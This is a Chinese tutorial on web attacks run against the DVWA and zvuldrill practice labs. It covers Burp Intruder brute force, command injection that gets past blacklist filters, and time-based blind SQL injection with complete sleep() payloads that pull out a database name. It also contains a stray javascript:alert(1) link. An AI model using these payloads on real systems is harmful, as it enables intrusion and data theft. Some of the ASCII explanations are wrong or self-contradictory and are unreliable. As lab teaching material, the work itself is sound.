
### [web常见漏洞攻防](中)
---

上一篇，我们讲解了如何搭建漏洞环境，这一节我们将通过探索dvwa的漏洞，简单对代码进行分析，初步了解代码审计的流程。

## [Brute Force]

暴力破解，故名思议，通过枚举字典猜解用户登录帐号及密码，没有很好的方法去避免被暴力破解，但可通过限制增加暴力破解的成本。

![](https://raw.githubusercontent.com/Orion1250/picture/master/1.png)

[XSS](javascript:alert(1))

图1

通过查看代码我们可以看到，该判断登录过程，未做任何有效的爆破限制，既无登录次数限制，也无验证码机制。

![](https://raw.githubusercontent.com/Orion1250/picture/master/2.png)

图2

下面我们使用burp进行暴力破解该登录用户名及密码

这里我们设置代理对该位置进行爆破，有人会问，如何设置代理，下面我们简单介绍下

首先，需要我们设置burp，设置127.0.0.1，端口为8080

![](https://raw.githubusercontent.com/Orion1250/picture/master/3.png)

图3

其次，在浏览器中设置代理，同样将代理设置为127.0.0.1，端口为8080

![](https://raw.githubusercontent.com/Orion1250/picture/master/4.png)
 
图4

下面开始抓取请求包
 
![](https://raw.githubusercontent.com/Orion1250/picture/master/5.png)

图5

发送到intruder进行暴力破解

![](https://raw.githubusercontent.com/Orion1250/picture/master/6.png)
 
图6

使用cluster bomb，并选中username、password参数，进行爆破

![](https://raw.githubusercontent.com/Orion1250/picture/master/7.png)
 
图7

下面选择payloads，其中1为用户帐号，2为密码

![](https://raw.githubusercontent.com/Orion1250/picture/master/8.png) 

图8

Payload2字典，可以看到需要请求32次，也就是将所有对应的payload进行遍历一次

![](https://raw.githubusercontent.com/Orion1250/picture/master/9.png)
 
图9

这里按长度进行排序，可以看到猜解出正确的用户名与密码

![](https://raw.githubusercontent.com/Orion1250/picture/master/10.png)
 
图10

## Command Injection
### low

![](https://raw.githubusercontent.com/Orion1250/picture/master/11.png)
 
图11

查看代码我们可以发现，代码中未对输入参数进行校验，直接进行执行

shell_exec函数：

通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回

![](https://raw.githubusercontent.com/Orion1250/picture/master/12.png)
 
图12

Windows和Linux均可使用&&进行执行多条命令

![](https://raw.githubusercontent.com/Orion1250/picture/master/13.png) 

图13

### medium

可发现对&&和：进行了过滤，但是使用黑名单过滤机制可能会存在过滤不完全的可能。而导致被绕过

![](https://raw.githubusercontent.com/Orion1250/picture/master/14.png)
 
图14

发现没有对&进行过滤，我们使用&发现可正常执行命令

![](https://raw.githubusercontent.com/Orion1250/picture/master/15.png)
 
图15

简单介绍下“&&”、“&”、“||”、“|”的区别

`命令1&&命令2`

&&：如果前面的条件已经是false了，那么后面的条件不需要再进行任何的判断

![](https://raw.githubusercontent.com/Orion1250/picture/master/16.png)
 
图16

`命令1&命令2`

&：表示所有的判断条件都要执行，不管前面是否满足

![](https://raw.githubusercontent.com/Orion1250/picture/master/17.png)
 
图17

`命令1 | 命令2`

|：是管道符，表示将命令1的输出作为命令 2的输入，并且只打印命令2执行的结果

![](https://raw.githubusercontent.com/Orion1250/picture/master/18.png)
 
图18

`命令1||命令2`

||：或者的意思，如果命令1是true，那么就不判断，若前面为false，才会执行命令2

![](https://raw.githubusercontent.com/Orion1250/picture/master/19.png)
 
图19

### High

同样，查看高级可以看到同样使用黑名单机制，依然可以绕过，这里不在进行测试

![](https://raw.githubusercontent.com/Orion1250/picture/master/20.png)
 
图20

下面简单介绍下时间型注入，这里使用的漏洞环境为zvuldrill

## SQL注入小计

首先，使用’测试，查看是否存在注入点，可以发现页面出现报错，说明可能存在注入

![](https://raw.githubusercontent.com/Orion1250/picture/master/21.png)
 
图21

下面进一步测试，这里我们使用or进行测试1' or 1=1#，#表示注释，or表示两边有一个为真即为真，这里使用1=1，1=1我们知道肯定为真，那么该语句肯定为真，可以看到页面正常显示，并将所有的信息显示出来

![](https://raw.githubusercontent.com/Orion1250/picture/master/22.png)
 
图22

使用or进行测试1' or 1=2#，1=2说明永假，两边都为假，那么肯定是假，可以看到页面未显示数据

![](https://raw.githubusercontent.com/Orion1250/picture/master/23.png)
 
图23

下面我们学习下时间型注入，主要是通过查看数据库的响应时间来判断是否存在注入漏洞，这里我们设置为5秒，若页面会有5秒钟的延时，说明可通过该处插入SQL语句，与数据库进行交互

判断是否存在时间型注入

查看延时前的页面

![](https://raw.githubusercontent.com/Orion1250/picture/master/24.png)
 
图24

查看插入延时语句后的页面

`1%' and (select * from (select(sleep(5)))a)-- -`

可以看到出现延时，延时5秒

![](https://raw.githubusercontent.com/Orion1250/picture/master/25.png)
 
图25

这里我们对数据库进行猜解，并简单介绍下有关函数。

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))>65,0,5)))))a)-- -`

说明：

schema_name表示数据库名称

ifnull表示判断数据是否为空

distinct表示选出重复的数据

mid表示用于从文本字段中提取字符

ord表示如果最左边的字符的字符串str是一个多字节字符，返回该字符的数据 

if函数表示判断，对数据进行判断

65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等。

这条注入语句的意思是对数据库进行猜解，判断第一个字符是否大于65，也就是该字符的acsii码是否大于65,65表示a，大于时5-0，延时5秒，不大于时延时5-5秒，也就是0秒。通过查看延时时间进行判断该位置字符，这里我们看到延时了，说明大于65。

![](https://raw.githubusercontent.com/Orion1250/picture/master/26.png)
 
图26

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))>96,0,5)))))a)-- -`

这条注入语句的意思是对数据库进行猜解，判断第一个字符是否大于65，也就是该字符的acsii码是否大于96,96表示A的前一个字符，大于时5-0，延时5秒，不大于时延时5-5秒，也就是0秒。通过查看延时时间进行判断该位置字符，这里我们看到延时了，说明大于96。

![](https://raw.githubusercontent.com/Orion1250/picture/master/27.png)
 
图27

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))>112,0,5)))))a)-- -`

这条注入语句的意思是对数据库进行猜解，判断第一个字符是否大于112，这里使用折半的方式进行猜解，以减少猜解的时间，也就是该字符的acsii码是否大于112，大于时5-0，延时5秒，不大于时延时5-5秒，也就是0秒。通过查看延时时间进行判断该位置字符，这里我们没有，说明小于112。

![](https://raw.githubusercontent.com/Orion1250/picture/master/28.png)
 
图28

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))>104,0,5)))))a)-- -`

这条注入语句的意思是对数据库进行猜解，判断第一个字符是否大于104，这里使用折半的方式进行猜解，以减少猜解的时间，也就是该字符的acsii码是否大于104，大于时5-0，延时5秒，不大于时延时5-5秒，也就是0秒。通过查看延时时间进行判断该位置字符，这里我们没有，说明大于104。

![](https://raw.githubusercontent.com/Orion1250/picture/master/29.png)
 
图29

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))>108,0,5)))))a)-- -`

这条注入语句的意思是对数据库进行猜解，判断第一个字符是否大于108，这里使用折半的方式进行猜解，以减少猜解的时间，也就是该字符的acsii码是否大于108，大于时5-0，延时5秒，不大于时延时5-5秒，也就是0秒。通过查看延时时间进行判断该位置字符，说明大于108。

![](https://raw.githubusercontent.com/Orion1250/picture/master/30.png)
 
图30

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))>110,0,5)))))a)-- -`

这条注入语句的意思是对数据库进行猜解，判断第一个字符是否大于110，这里使用折半的方式进行猜解，以减少猜解的时间，也就是该字符的acsii码是否大于110，大于时5-0，延时5秒，不大于时延时5-5秒，也就是0秒。通过查看延时时间进行判断该位置字符，这里我们没有，说明小于110。

![](https://raw.githubusercontent.com/Orion1250/picture/master/31.png)
 
图31

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))=109,0,5)))))a)-- -`

上面看到已经在108-110之间了，所以不是109就是110，我们看等于109时的时间，可以看到延时了5秒，说明等于109。也就是小写字母m

![](https://raw.githubusercontent.com/Orion1250/picture/master/32.png)
 
图32

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),1,1))=110,0,5)))))a)-- -`

可以看到该语句未延时，说明猜测正确

![](https://raw.githubusercontent.com/Orion1250/picture/master/33.png)
 
图33

其他参数猜测过程一样，这里不再进行猜测，直接将猜到该字符的语句写出，这里猜测的数据库为mysql，ascii码分别为109、121、115、113、108。

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),2,1))=121,0,5)))))a)-- -`

我们看到该语句中将位置改为2也就是要猜第二个字符，其他字符同理

![](https://raw.githubusercontent.com/Orion1250/picture/master/34.png)
 
图34

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),3,1))=115,0,5)))))a)-- -`

![](https://raw.githubusercontent.com/Orion1250/picture/master/35.png)
 
图35

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),4,1))=113,0,5)))))a)-- -`

![](https://raw.githubusercontent.com/Orion1250/picture/master/36.png)
 
图36

`1%' and (select * from (select(sleep(5-(if(ord(mid((select distinct(ifnull(cast(schema_name as char),0x20)) from information_schema.schemata limit 1,1),5,1))=108,0,5)))))a)-- -`

![](https://raw.githubusercontent.com/Orion1250/picture/master/37.png)
 
图37






